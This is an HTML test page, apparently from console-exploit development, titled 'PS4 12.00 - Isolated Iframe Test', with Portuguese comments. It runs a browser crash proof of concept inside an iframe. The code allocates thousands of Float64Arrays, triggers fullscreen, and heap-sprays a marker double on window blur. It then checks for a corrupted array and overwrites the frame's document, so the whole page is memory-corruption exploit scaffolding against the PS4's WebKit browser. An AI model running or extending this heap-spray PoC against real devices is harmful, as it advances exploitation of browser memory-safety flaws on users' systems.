<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Iframe Isolation - Leandro</title>
</head>
<body>

    <h1>PS4 12.00 - Isolated Iframe Test</h1>
    <p>Objetivo: Rodar o Crash PoC original dentro de um frame para manter a aba pai viva.</p>

    <button onclick="setupAndRun()">1. Setup & Run (Iframe Context)</button>
    
    <div id="frame-container" style="margin-top: 20px;">
        </div>

    <script>
    function setupAndRun() {
        const container = document.getElementById('frame-container');
        
        // Criando o Iframe
        container.innerHTML = '<iframe id="pocFrame" style="width:500px; height:300px; border:1px solid #000;"></iframe>';
        
        const frame = document.getElementById('pocFrame');
        const fDoc = frame.contentWindow.document;

        // Injetando EXATAMENTE o seu código de sucesso no frame
        fDoc.open();
        fDoc.write(`
            <!DOCTYPE html>
            <html>
            <body>
                <h3>Iframe Content Active</h3>
                <p id="status">Preparing Objects...</p>
                <script>
                    const PATTERN = 2.121995791e-314;
                    let controllers = [];

                    // Passo 1: Criar objetos (Identico ao seu)
                    for(let i = 0; i < 5000; i++) {
                        let arr = new Float64Array(8);
                        arr[0] = i;
                        controllers.push(arr);
                    }
                    document.getElementById('status').innerText = "Objects Ready. Enter Fullscreen.";

                    // Função para disparar dentro do frame
                    window.startPoC = function() {
                        const elem = document.documentElement;
                        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
                        
                        window.onblur = function() {
                            // Passo 2: Spray
                            let spray = [];
                            for(let i = 0; i < 8000; i++) {
                                let p = new Float64Array(10);
                                p.fill(PATTERN);
                                spray.push(p);
                            }

                            // Passo 3: Verificação
                            let corrupted = null;
                            for(let i = 0; i < controllers.length; i++) {
                                if (controllers[i][0] === PATTERN) {
                                    corrupted = controllers[i];
                                    break;
                                }
                            }

                            if (corrupted) {
                                // PASSO FINAL: O document.write dentro do frame
                                setTimeout(() => {
                                    document.open();
                                    document.write('<html><body><h1>Frame Crashed</h1></body></html>');
                                    document.close();
                                }, 1000);
                            }
                        };
                    };
                <\/script>
                <button onclick="startPoC()">2. Start Fullscreen (Inside Frame)</button>
            </body>
            </html>
        `);
        fDoc.close();
    }
    </script>

</body>
</html>
